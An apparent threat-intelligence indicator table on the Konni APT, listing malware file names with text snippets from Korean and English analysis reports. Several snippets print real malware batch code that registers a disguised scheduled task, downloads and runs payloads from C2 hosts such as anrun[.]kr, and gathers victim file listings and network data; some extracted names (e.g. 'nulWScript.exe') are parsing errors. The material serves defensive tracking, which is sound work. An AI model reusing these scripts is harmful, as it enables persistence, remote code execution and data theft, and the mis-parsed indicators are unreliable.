1.0.0,actor--konni,artifact--sha256:ad3e70b6cc31ebde0dc82c7b31c262aecf8df7e4f94bba5a25f3b2a19d1ff5e5,observation--sha256:690d07c1ac93c26d977777435fc9f50ac58635481c74bd7bcbd96ce007a450af,file-name,install.vbs,install.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.2. ZIP압축파일에포함된BAT파일분석■'stopedge.bat' 파일코드분석 ○ 'stopedge.bat' 파일은 'update.vbs' 파일에 의해 호출되는 배치 명령을 가지고있습니다. @echooff pushd""%~dp0""if exist ""paycom.ini"" (schtasks /create/scminute/mo33/tn""MicrosoftEdgeEasyUpdate"" /tr ""%~dp0install.vbs"" /fdel /f /q%~dp0paycom.ini) call versioninfo.batdel /f /qversioninfo.battimeout -t 5/nobreakdel /f /qupdate.vbs[표4-5] 'stopedge.bat' 파일명령어화면 ○배치파일은명령어내용이화면에출력되지않도록숨기기위해'echo off' 설정을하고, 'pushd ""%~dp0""' 선언으로 명령 프롬프트가 배치 파일이 존재하는 경로로설정합니다. ○다",
1.0.0,actor--konni,artifact--sha256:ad3e70b6cc31ebde0dc82c7b31c262aecf8df7e4f94bba5a25f3b2a19d1ff5e5,observation--sha256:fe610c342793e7e139948200999604be0366011b479e3549ee2a646898bff7b3,file-name,install.vbs,install.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■'resolvedns.bat' 파일코드분석 ○'resolvedns.bat' 파일은앞서작업스케줄러에등록된'install.vbs' 파일이실행될경우호출이됩니다. @echooff pushd""%~dp0"" set ttn=324093set tty=230704seturl=http://anrun[.]kr/movie/contents.php?fifo=%COMPUTERNAME% if exist ""stopedge.bat"" (del /f /qstopedge.bat)if exist ""%ttn%.zip"" (del /f /q%ttn%.zip)WScript.exeactivate.vbs ""%url%"" ""%ttn%.zip"" if exist ""%ttn%.zip"" (call unzip.exe-P""a"" -o""%~dp0%ttn%.zip"" >nuldel /f /q%~dp0%ttn%.zip>nulWScript.exe""%tty%.vbs""del /f /q%tty%.vbs >nul) [",
1.0.0,actor--konni,artifact--sha256:ad3e70b6cc31ebde0dc82c7b31c262aecf8df7e4f94bba5a25f3b2a19d1ff5e5,observation--sha256:ca4cf5ee009282fa493b2fa57ef503c72549f4daaebd1a2c72ac57f74a356ab9,file-name,install.vbs,install.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○LNK 바로가기파일에의해Drop 되는ZIP 압축파일은다음과같은구성을가지고있습니다. 국세청사칭ZIP파일구성 북한인권단체사칭ZIP파일구성 start.vbs update.vbs 07856126.bat paycom.ini 19288086.bat resolvedns.bat 30966118.bat stopedge.bat 32981202.bat versioninfo.bat 73888454.bat activate.vbs unzip.exe unactivate.vbs - install.vbs - unzip.exe[표5-2] Konni 캠페인별ZIP파일비교화면 ○국세청사칭의경우'73888454.bat' 파일은'30966118.bat' 파일이존재할경우레지스트리 Run 경로에 'start.vbs' 파일을 등록해 지속성을 유지합니다. 반면,북한인권단체 사칭의 경우 'stopedge.bat' 파일은 'paycom.ini' 파일이존재할경우작업 스케줄러 생성을 통해",
1.0.0,actor--konni,artifact--sha256:ad3e70b6cc31ebde0dc82c7b31c262aecf8df7e4f94bba5a25f3b2a19d1ff5e5,observation--sha256:164d1ef5ef2bbd95ae37ce97d1cd51592a58d0cb4dd6ea62673ea3d63fbf142c,file-name,install.vbs,install.vbs,candidate,,unknown,unknown,not-stated,,source--konni--8c179de8de042c5a,konni/the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TheKonni APTChronicle: TracingTheir Intelligence-DrivenAttackChain stopedge.bat If afilenamed""paycom.ini"" existsinthestopedge.bat’sdirectory, it schedulesatasktorun""install.vbs"" every33minutes, deletes""paycom.ini,"" calls""versioninfo.bat,"" waitsfor 5seconds, andthendeletes""versioninfo.bat"" and""update.vbs."" Figure11- Persistencymechanismwithscheduledtasks resolvedns.bat Thebatchscript 'resolvedns.bat' utilizes'activate.vbs' toinitiatethedownloadof afilefromtheC2server. Figure12- Dnsresolutionandge",
1.0.0,actor--konni,artifact--sha256:ad3e70b6cc31ebde0dc82c7b31c262aecf8df7e4f94bba5a25f3b2a19d1ff5e5,observation--sha256:622513aed03b935949f0c6ce5ea7ba67c0913b3abcbce6b6bf45a11061dce997,file-name,install.vbs,install.vbs,candidate,,unknown,unknown,not-stated,,source--konni--8c179de8de042c5a,konni/the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TheKonni APTChronicle: TracingTheir Intelligence-DrivenAttackChain Technical Analysis Initial Compression Theattackchainbeginswiththedownloadof anISOimagefromanITWURL. ThisISOimagesubsequentlydeploysanother zipfile, whichcontainsmaliciousscripts. Figure2- Zipfilecontainslotsof scripts install.vbs Theinstall.vbsscript isheavilyobfuscatedusingXORandvariousother techniques. Figure3- Obfuscatedinstall.vbs Thedeobfuscatedversionof theVBScript isquitestraightforward; it merelyexecutesanother batchscri",
1.0.0,actor--konni,artifact--sha256:ad3e70b6cc31ebde0dc82c7b31c262aecf8df7e4f94bba5a25f3b2a19d1ff5e5,observation--sha256:da56b92820f47375f37ccac567cbc9d91805c40fd626ef49b22155df91132bd7,file-name,install.vbs,install.vbs,candidate,,unknown,unknown,not-stated,,source--konni--8c179de8de042c5a,konni/the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TheKonni APTChronicle: TracingTheir Intelligence-DrivenAttackChain update.vbs The'update.vbs' closelyresembles'install.vbs,' employingthesameobfuscationtechniquesandperformingidentical tasks. Figure5- Obfuscatedupdate.vbs However, itsdistinctivefeatureisthat it executesascript named'stopedge.bat'. Figure6- Deobfuscatedupdate.vbs 7",
1.0.0,actor--konni,artifact--sha256:30b60c59bdf2fa9551a490cd9e9b323ff1d3bdedbbf34b75ae18a24db31ab99a,observation--sha256:ae376371aeca8b4263faaea01f6bcd68f20c0c6fbfc475bee6443731712f46ea,file-name,list.php,list.php,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 25 ○ (goto 1) 루틴으로 점프하면, 가장 먼저 ‘temprun.bat’ 파일이 있는지 비교하고 존재할 경우 삭제를 진행합니다. 그리고 call 배치 명령을 통해 ‘19288086.bat’ 파일을 호출합니다. call 19288086.bat ""http://overseeby[.]com/list.php?f=%COMPUTERNAME%.txt"" ""%~dp0IxOkj.cab"" ""1""> nul expand IxOkj.cab -F:* %~dp0 > nul del /f /q IxOkj.cab > nul call temprun.bat > nul [표 09] C2 호스트에서 압축파일 다운로드 및 실행 과정 화면 ○ C2(overseeby [.]com) 명령을 통해 감염된 컴퓨터명의 파일이 서버에 존재할 경우 ‘IxOkj.cab’ 이름으로 다운로드하고 ‘expand’ 명령을 통해 압축을 풀고 삭제합니다. ",
1.0.0,actor--konni,artifact--sha256:e68669fe5287c69b19581195c324f21b7d04d0e3236f062ce9528f8dc0a4843e,observation--sha256:49ef55f8a3c7be814954970cc40b7085a9194a20fca464858f465cd65b29f2f2,file-name,login.php,login.php,candidate,,unknown,unknown,not-stated,,source--konni--e22c456560b2d889,konni/bluesky.txt,"{""line"": 46}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,"header( ""Location: login.php"" );",
1.0.0,actor--konni,artifact--sha256:28ecaee36d5f5f569b1039f3e7c8ff2d9c164918aad33083c3423e57b402c448,observation--sha256:0ffcf1ebb2be6d8c1a0cd165776f4ab7c52fef49cad43a69dd9216466ce4e855,file-name,media.pdb,media.pdb,candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"The initial dropper, named mt4managre.exe, used a PDB path of: E:\Work\_Spyware\VIRUS_2020\Release\Dropper_exe_ media.pdb. The dropper can have a variable number of embedded payloads, which is defined by the last four bytes (DWORD) of the file (Figure 44). Figure 44. YoreKey dropper encoded config and number of payloads This value is then multiplied by 76 to find the size of the config. The config precedes the last four bytes of the file. This particular dropper only had two embedded payloads, s",
1.0.0,actor--konni,artifact--sha256:3c00026fe815208fb10fdf3e93959523b92948a638782860720f9bff4d08c609,observation--sha256:1e353db25517527df4d223428d6c3d9e06ea022a6a0142629af614575c0d3747,file-name,mfc100.dll,mfc100.dll,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○'securityMail_1031.html.lnk', 'securityMail_1101.html.lnk' 파일명의바로가기파일이며, 2중확장자기법을동일하게사용했습니다. [그림5-4] 카카오뱅크보안메일유사변종LNK악성코드명령어화면 ○ Powershell 명령어를 통해 내장된 정상 html 파일을 생성해 보여주고, ZIP 압축파일과 BAT 파일을 통해 'mfc100.dll' 라이브러리호출이진행됩니다. 'mfc100.dll'파일은ZIP 압축내부에포함돼있고, 배치파일내'rundll32.exe' 명령과Run인자값이조합되어실행됩니다. 여기서사용된'mfc100.dll' 파일은'Themida' 상용소프트웨어 6 프로텍터로 패킹되어 있으며, 'naver-file[.]com' (5.8.71.81 [일본]) 호스트를C2 로사용하는AmadeyBot 유형입니다. ○당시식별된Passive DNS중에는'nate-download[.]com' (172.86.123.0",
1.0.0,actor--konni,artifact--sha256:bca7b089a01a8178eeeeae6866933189413713be3d6dbed20b4b53a7098c60e0,observation--sha256:8566ab56484a9437da96b2a2203a725e7ff3171c175d07e6420aa7f87a9f3e0e,file-name,modif8.doc,modif8.doc,candidate,,unknown,unknown,not-stated,,source--konni--e22c456560b2d889,konni/bluesky.txt,"{""line"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,modif8.doc,
1.0.0,actor--konni,artifact--sha256:023cd6489fa36e7d01ed5220ba260ce4ce289c78a7c0beb84fec4a697224a99a,observation--sha256:39aed64cc3ceb6524939f1f93e3194004356a2ef22108dca1e0cb3682049e4e0,file-name,mt4managre.exe,mt4managre.exe,candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"The initial dropper, named mt4managre.exe, used a PDB path of: E:\Work\_Spyware\VIRUS_2020\Release\Dropper_exe_ media.pdb. The dropper can have a variable number of embedded payloads, which is defined by the last four bytes (DWORD) of the file (Figure 44). Figure 44. YoreKey dropper encoded config and number of payloads This value is then multiplied by 76 to find the size of the config. The config precedes the last four bytes of the file. This particular dropper only had two embedded payloads, s",
1.0.0,actor--konni,artifact--sha256:d172584daa6851dd23423867d50089347de777335b10009609b58015a4f40d93,observation--sha256:d18687e19848b6950da1f8dda81434902b820ec633e9c18e27458046083d57d9,file-name,nulWScript.exe,nulWScript.exe,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■'resolvedns.bat' 파일코드분석 ○'resolvedns.bat' 파일은앞서작업스케줄러에등록된'install.vbs' 파일이실행될경우호출이됩니다. @echooff pushd""%~dp0"" set ttn=324093set tty=230704seturl=http://anrun[.]kr/movie/contents.php?fifo=%COMPUTERNAME% if exist ""stopedge.bat"" (del /f /qstopedge.bat)if exist ""%ttn%.zip"" (del /f /q%ttn%.zip)WScript.exeactivate.vbs ""%url%"" ""%ttn%.zip"" if exist ""%ttn%.zip"" (call unzip.exe-P""a"" -o""%~dp0%ttn%.zip"" >nuldel /f /q%~dp0%ttn%.zip>nulWScript.exe""%tty%.vbs""del /f /q%tty%.vbs >nul) [",
1.0.0,actor--konni,artifact--sha256:e284d35618ad4e33f63e3f7accb689864f542346d6408f2d085d8d522b782dd4,observation--sha256:0a70b7e03f59b7554caa747b6de510393b66efb6ee24f3ff71a9616658e096f1,file-name,paycom.ini,paycom.ini,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport [그림3-3] 'update_cmd.zip' 압축해제후화면 ○각파일의정보를간략히살펴보면다음과같습니다. 'unzip.exe' 파일은압축해제용도의정상유틸리티로이것을제외하면나머지는모두악성파일입니다. 파일명 정보(크기, 기능, MD5) update.vbs 1,579바이트 stopedge.bat 호출 90468e4bdf61cf146030515ed3e15d81 stopedge.bat 271바이트 'paycom.ini' 조건문에따라작업스케줄러등록(install.vbs호출) 및'paycom.ini' 삭제, 'versioninfo.bat' 호출및삭제, 'update.vbs' 삭제 ff4067b4865c9b49da2f28ac12ca5c1a paycom.ini 475바이트 셋업조건및특정제품고유식별자( GUID형식) 목록의설치나변경을차단하는설정파일 75ca52afafe3fe6c053da9f1db90590a Genians SecurityCenter 12",
1.0.0,actor--konni,artifact--sha256:e284d35618ad4e33f63e3f7accb689864f542346d6408f2d085d8d522b782dd4,observation--sha256:cc91137f7439d644012a77e513b4f7aa96bdd45c2b1cf3237cdbe91ebfb87bd6,file-name,paycom.ini,paycom.ini,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○ 주요 문자열은 10진수 값으로 선언되어 있고, XOR 로직을 통해 ASCII 문자로변환되는과정을거치게됩니다. [그림4-1] 'update.vbs' XOR연산부분을ASCII 문자로치환한화면 ○ 25개의 연산 항목을 문자열로 변경하면 다음과 같이 Windows Script Host(WScript.Shell) 를사용하여'stopedge.bat' 배치파일을호출하여실행하는것을알수있습니다. ■'install.vbs' 파일코드분석 ○'install.vbs' 파일은'stopedge.bat' 배치파일의내부명령조건(' paycom.ini' 파일존재의경우)에따라작업스케줄러( Schtasks) 로등록된후호출되는과정을거칩니다. Genians SecurityCenter 19",
1.0.0,actor--konni,artifact--sha256:e284d35618ad4e33f63e3f7accb689864f542346d6408f2d085d8d522b782dd4,observation--sha256:04b5a3ca3b4887b4e03555f78676001ab1be38a9abcd2f192a10c297fa86c3e0,file-name,paycom.ini,paycom.ini,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.2. ZIP압축파일에포함된BAT파일분석■'stopedge.bat' 파일코드분석 ○ 'stopedge.bat' 파일은 'update.vbs' 파일에 의해 호출되는 배치 명령을 가지고있습니다. @echooff pushd""%~dp0""if exist ""paycom.ini"" (schtasks /create/scminute/mo33/tn""MicrosoftEdgeEasyUpdate"" /tr ""%~dp0install.vbs"" /fdel /f /q%~dp0paycom.ini) call versioninfo.batdel /f /qversioninfo.battimeout -t 5/nobreakdel /f /qupdate.vbs[표4-5] 'stopedge.bat' 파일명령어화면 ○배치파일은명령어내용이화면에출력되지않도록숨기기위해'echo off' 설정을하고, 'pushd ""%~dp0""' 선언으로 명령 프롬프트가 배치 파일이 존재하는 경로로설정합니다. ○다",
1.0.0,actor--konni,artifact--sha256:e284d35618ad4e33f63e3f7accb689864f542346d6408f2d085d8d522b782dd4,observation--sha256:7d00719b7262964e653cc7f9cb7350014e55b7256b6c42ef1901127ae9257753,file-name,paycom.ini,paycom.ini,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○LNK 바로가기파일에의해Drop 되는ZIP 압축파일은다음과같은구성을가지고있습니다. 국세청사칭ZIP파일구성 북한인권단체사칭ZIP파일구성 start.vbs update.vbs 07856126.bat paycom.ini 19288086.bat resolvedns.bat 30966118.bat stopedge.bat 32981202.bat versioninfo.bat 73888454.bat activate.vbs unzip.exe unactivate.vbs - install.vbs - unzip.exe[표5-2] Konni 캠페인별ZIP파일비교화면 ○국세청사칭의경우'73888454.bat' 파일은'30966118.bat' 파일이존재할경우레지스트리 Run 경로에 'start.vbs' 파일을 등록해 지속성을 유지합니다. 반면,북한인권단체 사칭의 경우 'stopedge.bat' 파일은 'paycom.ini' 파일이존재할경우작업 스케줄러 생성을 통해",
1.0.0,actor--konni,artifact--sha256:e284d35618ad4e33f63e3f7accb689864f542346d6408f2d085d8d522b782dd4,observation--sha256:df57f7ebb0d0cde22f76e6d5faafaf8eccfcf822fea98953e8200852401eb822,file-name,paycom.ini,paycom.ini,candidate,,unknown,unknown,not-stated,,source--konni--8c179de8de042c5a,konni/the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TheKonni APTChronicle: TracingTheir Intelligence-DrivenAttackChain stopedge.bat If afilenamed""paycom.ini"" existsinthestopedge.bat’sdirectory, it schedulesatasktorun""install.vbs"" every33minutes, deletes""paycom.ini,"" calls""versioninfo.bat,"" waitsfor 5seconds, andthendeletes""versioninfo.bat"" and""update.vbs."" Figure11- Persistencymechanismwithscheduledtasks resolvedns.bat Thebatchscript 'resolvedns.bat' utilizes'activate.vbs' toinitiatethedownloadof afilefromtheC2server. Figure12- Dnsresolutionandge",
1.0.0,actor--konni,artifact--sha256:b416d9101022f2580a58eb1c6e8b623d414f66605731fcc5e5283758dfc48aaa,observation--sha256:5ced5bd2d90ed7e5a463124746adbe24ebc17d2ece8008d9f65c1908c8cdb107,file-name,pdf.lnk,pdf.lnk,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 3.2. 통일부조직개편설명자료사칭■[사례B] 전자우편발신지및첨부파일주소분석 ○해당이메일의발신주소지와첨부파일의링크경로를조회해보면다음과같습니다.두곳모두한국의특정도메인과아이피주소가사용됐습니다. 발신지주소 첨부파일주소 도메인 아이피 국가 도메인 아이피 국가 pi.m2comm.co[.]kr 121.254.129.93 KR ddmccic.or[.]kr 116.122.157.24 KR [표3-5] 해킹용전자우편발신지및첨부파일링크정보 ○[사례B] 이메일의발신주소지와첨부파일의링크경로를조회해보면앞서살펴본[사례A] 경우와같습니다. 모두한국의특정도메인과아이피주소가사용됐습니다. ○[사례A] 와[사례B] 가동일한위협배후소행인점을가늠해볼수있습니다. ■202308통일부조직개편설명자료. pdf.lnk ○공격에사용된바로가기( LNK) 유형의악성파일은PDF 문서처럼위장하기위해2중확장자를가지고있고, 다음과같은정보로구성돼있습니다. 파일명 202308통일부조직개편설명자료. p",
1.0.0,actor--konni,artifact--sha256:b416d9101022f2580a58eb1c6e8b623d414f66605731fcc5e5283758dfc48aaa,observation--sha256:3018b39b5ae3097dd0283f387e87a04fb07346ef76b094ceedd82e8973e4033d,file-name,pdf.lnk,pdf.lnk,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■[사례B] 통일부조직개편설명자료사칭 ○GSC 는[사례A] 식별이틀후인8월29일화요일에또다른공격을포착했습니다.해당 공격의 경우 현 통일부 장관의 명의를 무단 도용 및 사칭한 점에 비춰 북한의사이버도발과감성이더해졌다고평가됩니다. [그림2-3] 통일부장관명의를사칭한해킹메일화면 ○공격은통일부조직개편설명자료로위장돼있으며, '통일부조직개편설명자료. zip'파일이첨부돼있습니다. 하지만해당파일도전자우편에첨부된형태가아니라, [사례A] 케이스와동일하게국내특정대학교에서위탁운영하는육아종합지원센터로연결돼있습니다. 전자우편에는별도의본문내용이존재하지않습니다. ○ ZIP 압축 파일 내부에는 '202308 통일부조직개편 설명자료. pdf.lnk' 바로가기유형의 악성 파일이 포함돼 있고, 이전 사례와 동일하게 2중 확장자로 위장하고있습니다. 다만, 이번에는XLSX문서가아닌PDF문서처럼가장한것이다릅니다. ○바로가기( LNK) 파일내부에는정상'통일부조직개편설명자료. pd",
1.0.0,actor--konni,artifact--sha256:cca44374c345f3f318e6fe7f0f89d3fa620d2b9a537c094a1295bc8850bfdf2a,observation--sha256:1d842b6ba4a72c646ef48840b2703b1cb3ccccccdded63ab3e0cde161738dec1,file-name,qstopedge.bat,qstopedge.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■'resolvedns.bat' 파일코드분석 ○'resolvedns.bat' 파일은앞서작업스케줄러에등록된'install.vbs' 파일이실행될경우호출이됩니다. @echooff pushd""%~dp0"" set ttn=324093set tty=230704seturl=http://anrun[.]kr/movie/contents.php?fifo=%COMPUTERNAME% if exist ""stopedge.bat"" (del /f /qstopedge.bat)if exist ""%ttn%.zip"" (del /f /q%ttn%.zip)WScript.exeactivate.vbs ""%url%"" ""%ttn%.zip"" if exist ""%ttn%.zip"" (call unzip.exe-P""a"" -o""%~dp0%ttn%.zip"" >nuldel /f /q%~dp0%ttn%.zip>nulWScript.exe""%tty%.vbs""del /f /q%tty%.vbs >nul) [",
1.0.0,actor--konni,artifact--sha256:549e0255f8bffdd9934c27ad21689e8cc306f706285767009e19efad8d77dc29,observation--sha256:7bff1357973c87183f7a247270fb8177a3abfe4881b4f3543df42266694cd1ac,file-name,qunactivate.vbs,qunactivate.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■'versioninfo.bat' 파일코드분석 ○'versioninfo.bat' 파일은'stopedge.bat' 파일에의해호출되는배치명령입니다.본 파일은 피해자 컴퓨터의주요정보를수집해탈취시도하는정찰기능을수행하게됩니다. @echooffpushd""%~dp0""dir C:\Users\%username%\downloads\/s >%~dp0cuserdown.datadir C:\Users\%username%\documents\/s >%~dp0cuserdocu.datadir C:\Users\%username%\desktop\/s >%~dp0cuserdesk.datadir ""C:\ProgramFiles\"" >%~dp0cprog.datadir ""C:\ProgramFiles (x86)\"" >%~dp0cprog32.datanslookupmyip.opendns.comresolver1.opendns.com>%~dp0ipinfo.datatasklist >%~dp0",
1.0.0,actor--konni,artifact--sha256:299f3698dfb43afb44e421401f5c54018010a83d17c2a64683039bc870cc137e,observation--sha256:51fe11ea3329212957e1a51a4074033fc82feec938250688aafdc855ff374fa4,file-name,qupdate.vbs,qupdate.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.2. ZIP압축파일에포함된BAT파일분석■'stopedge.bat' 파일코드분석 ○ 'stopedge.bat' 파일은 'update.vbs' 파일에 의해 호출되는 배치 명령을 가지고있습니다. @echooff pushd""%~dp0""if exist ""paycom.ini"" (schtasks /create/scminute/mo33/tn""MicrosoftEdgeEasyUpdate"" /tr ""%~dp0install.vbs"" /fdel /f /q%~dp0paycom.ini) call versioninfo.batdel /f /qversioninfo.battimeout -t 5/nobreakdel /f /qupdate.vbs[표4-5] 'stopedge.bat' 파일명령어화면 ○배치파일은명령어내용이화면에출력되지않도록숨기기위해'echo off' 설정을하고, 'pushd ""%~dp0""' 선언으로 명령 프롬프트가 배치 파일이 존재하는 경로로설정합니다. ○다",
1.0.0,actor--konni,artifact--sha256:860119ec3fd7c3a1cdc1c93838c2021189aacddadb7ddfc4d82a4bdc58eb2928,observation--sha256:02181cdf7b2a415b79c0f905a52c147d6a12c3d46bfbd1aafaa29c386f9d300e,file-name,resolvedns.bat,resolvedns.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport install.vbs 1,652바이트 resolvedns.bat 호출 db31a36e1684c568fa3529d60a59ba29 versioninfo.bat 1,143바이트 시스템정보수집및anrun[.]kr 서버로유출시도 168bcc063501d191d82aaa3a32741a12 unactivate.vbs 6,644바이트 XMLHTTPPOSTContent-Typeform명령어 6b944c9dc4b760fffb56adf4fecf6764 resolvedns.bat 432바이트 anrun[.]kr 서버에서324093.zip다운로드및실행시도 892bd45372876d29e883e114981e311b activate.bat 2,331바이트 XMLHTTPGETAdodb.Stream명령어 b86c38ae5c24c55831d7f8ca3cbeb814 unzip.exe 167,936바이트 Unzip5.52압축해제정상유틸리티 75375c22c72f1beb7",
1.0.0,actor--konni,artifact--sha256:860119ec3fd7c3a1cdc1c93838c2021189aacddadb7ddfc4d82a4bdc58eb2928,observation--sha256:6d5d4ea7c3d78be294ad2e0ff3f97d329e13cdbbb0394a14814161d287d76829,file-name,resolvedns.bat,resolvedns.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 22}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport [그림4-2] 'install.vbs' XOR연산부분을ASCII 문자로치환한화면 ○ 27개의 연산 항목을 문자열로 변경하면 다음과 같이 Windows Script Host(WScript.Shell) 를사용하여'resolvedns.bat' 배치파일을호출하여실행하는것을알수있습니다. ■'activate.vbs' 파일코드분석 ○'activate.vbs' 파일은'resolvedns.bat' 파일에의해호출되는스크립트입니다. 해당스크립트는C2 서버( anrun[.]kr) 에서지정된컴퓨터명(% COMPUTERNAME%) 으로별도 조건에 따라 연결되며, 지정된 환경변수명( ttn) 과 zip 확장자가 결합된'324093.zip' 파일을다운로드하는데사용됩니다. OnError ResumeNext Genians SecurityCenter 21",
1.0.0,actor--konni,artifact--sha256:860119ec3fd7c3a1cdc1c93838c2021189aacddadb7ddfc4d82a4bdc58eb2928,observation--sha256:4805d09c8a8e4962562e65aa27080cab33b3ae2d993339819e9e6800b41220c5,file-name,resolvedns.bat,resolvedns.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■'resolvedns.bat' 파일코드분석 ○'resolvedns.bat' 파일은앞서작업스케줄러에등록된'install.vbs' 파일이실행될경우호출이됩니다. @echooff pushd""%~dp0"" set ttn=324093set tty=230704seturl=http://anrun[.]kr/movie/contents.php?fifo=%COMPUTERNAME% if exist ""stopedge.bat"" (del /f /qstopedge.bat)if exist ""%ttn%.zip"" (del /f /q%ttn%.zip)WScript.exeactivate.vbs ""%url%"" ""%ttn%.zip"" if exist ""%ttn%.zip"" (call unzip.exe-P""a"" -o""%~dp0%ttn%.zip"" >nuldel /f /q%~dp0%ttn%.zip>nulWScript.exe""%tty%.vbs""del /f /q%tty%.vbs >nul) [",
1.0.0,actor--konni,artifact--sha256:860119ec3fd7c3a1cdc1c93838c2021189aacddadb7ddfc4d82a4bdc58eb2928,observation--sha256:9ce9112b9b983e530c94599708899188a8c2dae467dc7ca1ef62134c81cc0aa8,file-name,resolvedns.bat,resolvedns.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○LNK 바로가기파일에의해Drop 되는ZIP 압축파일은다음과같은구성을가지고있습니다. 국세청사칭ZIP파일구성 북한인권단체사칭ZIP파일구성 start.vbs update.vbs 07856126.bat paycom.ini 19288086.bat resolvedns.bat 30966118.bat stopedge.bat 32981202.bat versioninfo.bat 73888454.bat activate.vbs unzip.exe unactivate.vbs - install.vbs - unzip.exe[표5-2] Konni 